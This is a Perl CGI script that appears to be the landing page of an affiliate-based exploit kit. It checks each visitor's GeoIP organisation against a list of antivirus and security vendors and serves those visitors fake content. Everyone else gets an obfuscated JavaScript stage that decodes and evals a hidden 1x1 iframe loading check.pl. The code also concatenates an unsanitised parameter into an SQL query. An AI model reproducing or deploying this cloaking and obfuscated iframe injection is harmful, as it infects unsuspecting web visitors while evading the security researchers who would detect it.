#!/usr/bin/perl
  
# index.pl
use CGI;
use DBI;
use Geo::IP;
require "config.pl";
require "lib/JsXOR.pm";

$q = new CGI;

$aff = $q->param('aff');
$referer = $ENV{HTTP_REFERER};
$real_ipadd = $ENV{REMOTE_ADDR};
$gi = Geo::IP->open( 'dep/GeoIPOrg.dat' );
$org_chk = $gi->org_by_addr($real_ipadd);
$org_chk =~ tr/[A-Z]/[a-z]/;

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Block known antivirus from quering
$antivporgcheck = $dbh->selectrow_array("SELECT antivp FROM affiliates WHERE affid='$aff'");

$antivpblockcheck = 0;
if($antivporgcheck eq 'yes')
{
  $antivpblockcheck = 1 if($org_chk =~ 'google');
  $antivpblockcheck = 1 if($org_chk =~ 'trend micro');
  $antivpblockcheck = 1 if($org_chk =~ 'kaspersky');
  $antivpblockcheck = 1 if($org_chk =~ 'avast');
  $antivpblockcheck = 1 if($org_chk =~ 'av-test');
  $antivpblockcheck = 1 if($org_chk =~ 'eset');
  $antivpblockcheck = 1 if($org_chk =~ 'sonicwall');
  $antivpblockcheck = 1 if($org_chk =~ 'microsoft');
  $antivpblockcheck = 1 if($org_chk =~ 'vnet s. r. o.');
  $antivpblockcheck = 1 if($org_chk =~ 'kindsight');
  $antivpblockcheck = 1 if($org_chk =~ 'websense');
  $antivpblockcheck = 1 if($org_chk =~ 'theplanet.com');
  $antivpblockcheck = 1 if($org_chk =~ 'level 3 communications');
}

if($antivpblockcheck eq '1')
{
  print $q->header();
  open(FILE2,"<dep/fakestats.js");
  while(<FILE2>)
  {
    $fakestats .= $_;
  }
  print "$fakestats";
}
else
{

       $urliframe = '<iframe src="' . $config{UrlToFolder} . '/check.pl?aff=' . $aff . '"  marginwidth="-1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>';
        $randomerase = JsXOR::generate_random_string(2);
        $garbagecomment = JsXOR::generate_random_string(15);
        
        $urliframe2 = 'document.write(\'' . $urliframe . '\')';
        
        $FUD = "";
	my @values = split('', $urliframe2);
        foreach my $val (@values)
        {
          $val =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
          $FUD .= $randomerase . $val;
        }
        
        my @bitss = split('', $randomerase);
        $repbit1 = $bitss[0];
        $repbit2 = $bitss[1];
        $repbit3 = $bitss[2];
        $repbit4 = $bitss[3];
	
        $secondstage = <<EOF;

blah='$FUD';
rep1 = '%';
repbit1 = '$repbit1';
repbit2 = '$repbit2';
repbit3 = '$repbit3';
repbit4 = '$repbit4';

bfbits = [117, 110, 101, 115, 99, 97, 112, 101];

bftext = '';
for (i=0; i < bfbits.length; i++) {
    bftext += String./* $garbagecomment */fromCharCode(bfbits[i]);
}


blahstring="var blahfunction1=" + bftext;
eval(blahstring);

rep =repbit1 + repbit2 + repbit3 + repbit4;
ume = blah.replace(new RegExp(rep, "g"), rep1);
eme = blahfunction1(ume);

eval(eme);

EOF

  #$encryptediframe = 'function tracker() { ' . $secondstage . ' }';
  $encryptediframe = $secondstage;
  print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');
  print "$encryptediframe";


}


$dbh->disconnect();

1;
